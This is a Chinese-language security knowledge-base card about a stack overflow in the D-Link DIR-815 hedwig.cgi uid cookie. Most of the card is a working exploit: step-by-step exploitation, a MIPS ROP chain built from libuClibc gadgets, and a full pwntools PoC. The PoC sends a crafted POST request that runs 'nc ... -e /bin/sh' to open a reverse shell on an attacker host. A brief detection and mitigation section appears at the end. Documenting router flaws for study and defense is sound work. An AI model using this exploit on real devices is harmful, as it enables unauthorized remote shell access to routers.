---
id: binary-pwn-stack-mips-hedwig-cgi-uid-rop
title: DIR-815 hedwig.cgi Cookie uid 栈溢出：MIPS ROP 绕过 system 空字节执行命令
type: scenario
domain: binary
path: binary/pwn/stack
technique: mips-hedwig-cgi-uid-stack-overflow-rop
tags:
- pwn
- stack-overflow
- mips
- router
- firmware
- rop
- cgi
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V123
  verified_at: '2026-11-06T04:14:22+08:00'
  notes: 已对照原文与28张图核对：hedwigcgi_main 仅 POST、两处 sprintf 溢出、sess_get_uid/sobj_get_string(uid+20)、checksec 无 canary/NX/PIE/RWX、关闭 ASLR、system 偏移 0x53200 与 system-1 处理、gadget 0x158c8/0x159cc、payload 长度公式、|| 分隔 /postxml、nc 回连均与原文/截图一致。原文未给 CVE 与固件版本，未设置 versions；frontmatter 无 sources/source_url。未验证点：本库未复跑该固件利用。
url: /docs/binary/pwn/stack/binary-pwn-stack-mips-hedwig-cgi-uid-rop/
draft: false
kb_aliases:
- DIR-815
- hedwig.cgi
- cgibin
- uid cookie
- MIPS ROP
- system-1
- ropper
---

## 一句话结论

DIR-815 的 `hedwig.cgi` 进入 `hedwigcgi_main` 后，从 Cookie 取 `uid`，`sobj_get_string(uid)` 返回 `uid+20` 处指针，再 `sprintf(vuln_s, "%s/%s/postxml", "/runtime/session", uid_string)` 写入 1024 字节栈缓冲区且不限长；由于无 canary/NX/PIE/ASLR，可用 libuClibc gadget 构造 MIPS ROP：先写 `system-1` 再用 `addiu $s0,$s0,1` 还原 `system`，把 `$s5` 指向命令并作为 `$a0`，用 `||` 隔开 sprintf 追加的 `/postxml`，最终执行 `nc ... -e /bin/sh`。

## 原理

- **入口**：`cgibin` 按 argv[0] 分发；`hedwig.cgi` 是 `cgibin` 的符号链接，进入 `hedwigcgi_main`；函数先 `strcasecmp(request_method, "POST")`，非 POST 返回 `unsupported HTTP request`。
- **uid 解析**：`sess_get_uid(uid)` 在 Cookie 中找 `uid` 项，取等号后的内容；`sobj_get_string(uid)` 判断 `uid` 非空且 `*(DWORD*)(uid+20)` 非空，返回 `uid+20` 处的指针（注意 `(int)uid+20` 是字节偏移，`(int*)uid+20` 是 4 字节元素偏移）。
- **溢出点**：`sprintf(vuln_s, "%s/%s/postxml", "/runtime/session", uid_string)`，`vuln_s` 长度 1024，uid 长度无限制；第二处 `sprintf(vuln_s, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", ...)` 也有溢出，但有 XML 检查。
- **保护**：`checksec cgibin` 显示 mips-32-little、No RELRO、No canary、NX unknown/GNU_STACK missing、No PIE（0x400000）、Stack Executable、RWX；关闭 ASLR（`echo 0 > /proc/sys/kernel/randomize_va_space`，重启失效）后地址固定。
- **MIPS ROP 难点**：
  - `cgibin` 内 gadget 地址可能不足 4 字节/含 NUL，发送时截断；改用 `libuClibc-0.9.30.1.so` 的 gadget，基址固定。
  - `system` 偏移 `0x53200` 含 `\x00`，直接 `p32` 会在 HTTP 报文中截断；发送 `system-1`（`0x531ff`），用 gadget `0x158c8: move $t9,$s5; jalr $t9; addiu $s0,$s0,1` 把 `$s0` 加回 `system`。
  - gadget `0x159cc: addiu $s5,$sp,0x10; move $a1,$s3; move $a2,$s1; move $t9,$s0; jalr $t9; move $a0,$s5`：`$s5 = $sp+0x10` 指向命令，`$a0=$s5` 作为 `system` 参数，`$t9=$s0` 跳转。
  - `sprintf` 会在 uid 后追加 `/postxml`，命令末尾用 `;` 或 `||` 分隔；`||` 可避免 `system` 因 `/postxml` 不存在报错。
- **结果**：`nc <attacker> <port> -e /bin/sh || ` 执行，获得路由器 shell。

## 触发条件

- 目标运行 DIR-815 固件/同类 cgibin httpd，`/hedwig.cgi` 可访问。
- 请求为 POST，Cookie 含 `uid=`，且 uid 长度可控。
- `vuln_s` 栈缓冲区无长度检查，二进制无 canary/NX/PIE；ASLR 可关闭或地址可预测。
- 有可用的 libuClibc gadget 和 `system` 符号；能发送原始 HTTP 报文（避免 p32 中的 NUL 被截断）。

## 利用步骤

1. 仿真固件并启动 httpd（见关联卡）；访问 `/hedwig.cgi` 确认 XML 回显。
2. 静态分析 `cgibin`，定位 `hedwigcgi_main`、`sess_get_uid`、`sobj_get_string` 和两处 `sprintf`；确认 POST 限制与溢出偏移。
3. `checksec cgibin`；关闭 ASLR；用 gdbserver + gdb-multiarch `catch exec`，在 `sprintf` 调用点（如 0x40967C）下断，发送超长 uid 确认栈溢出。
4. 用 ropper 在 `libuClibc` 找 gadget：`move $t9,$s5; jalr $t9; addiu $s0,$s0,1`、`addiu $s5,$sp,0x10; ... move $a0,$s5`；确认 `system` 偏移。
5. 计算溢出长度；布置 `system-1`、保存寄存器、gadget2、gadget1、命令串。
6. 发送 POST 请求，Cookie uid 为 payload；命令用 `||` 分隔；在攻击机 `nc -lv` 接收 shell。
7. 若失败，检查 NUL 截断、偏移、ASLR、gadget 地址和 `/postxml` 追加位置。

## PoC

```python
from pwn import *

context.log_level = "debug"
io = remote("<target>", 8080)

base = 0x77f34000
system_addr = 0x53200
gadget_1 = 0x158c8  # move $t9,$s5; jalr $t9; addiu $s0,$s0,1
gadget_2 = 0x159cc  # addiu $s5,$sp,0x10; ... move $t9,$s0; jalr $t9; move $a0,$s5

cmd = b"nc 192.168.199.133 7777 -e /bin/sh || "
length = 20 + 1024 - 17 + 8 + 8 - 0x24

cookie_payload  = b"a" * length
cookie_payload += p32(base + system_addr - 1)
cookie_payload += b"b" * 4 * 4
cookie_payload += p32(base + gadget_2)
cookie_payload += b"c" * 4 * 3
cookie_payload += p32(base + gadget_1)
cookie_payload += b"d" * 0x10
cookie_payload += cmd

body = b""
request  = b"POST /hedwig.cgi HTTP/1.1\r\n"
request += b"Host: <target>:8080\r\n"
request += b"Cookie: uid=" + cookie_payload + b"\r\n"
request += b"Content-Type: application/x-www-form-urlencoded\r\n"
request += b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
request += body
io.send(request)
io.interactive()
```

## 变体与关联

- **溢出点变体**：`sprintf(vuln_s, "/htdocs/webinc/fatlady.php\nprefix=%s/%s", ...)` 第二处；XML 检查/内容类型可能限制。
- **架构变体**：MIPS32/64、ARM、x86 路由器 CGI；gadget 选择、空字节处理、调用约定不同。
- **保护变体**：无 canary/NX/PIE 时可直接 ROP/ret2libc；有 ASLR 时需泄露；有 NX 时用 ROP 调 `system`/`mprotect`。
- **关联卡片**：[[code-analysis-reverse-firmware-qemu-system-mipsel-router-httpd]]（固件仿真）、[[code-analysis-reverse-firmware-qemu-user-mips-ldpreload-gdb]]（user-mode MIPS 调试）、[[binary-pwn-stack-ret2text-win-plus-one-align]]（栈溢出基础）、[[binary-pwn-rop-mov-rsp-rdi-jmp-r13-system]]（ROP 调 system）。
- **边界**：实际固件版本/编译选项可能不同；ASLR 未关闭、gadget 地址变化、NUL 截断、`/postxml` 追加都会导致失败。

## 检测与防御

- **代码修复**：用 `snprintf` 限制写入长度；对 Cookie `uid` 做长度/字符校验；不要用 `sprintf` 拼接用户输入。
- **编译缓解**：开启 canary、NX、PIE、Full RELRO、ASLR；移除可执行栈。
- **检测信号**：`/hedwig.cgi` 收到超长 `uid` Cookie；CGI 进程 500/崩溃；`system`/`nc` 子进程；异常 ROP 栈。
- **测试建议**：先确认崩溃/偏移，再关闭 ASLR 调试；用原始 HTTP 报文避免 NUL 截断；命令用 `||`/`;` 分隔追加内容。
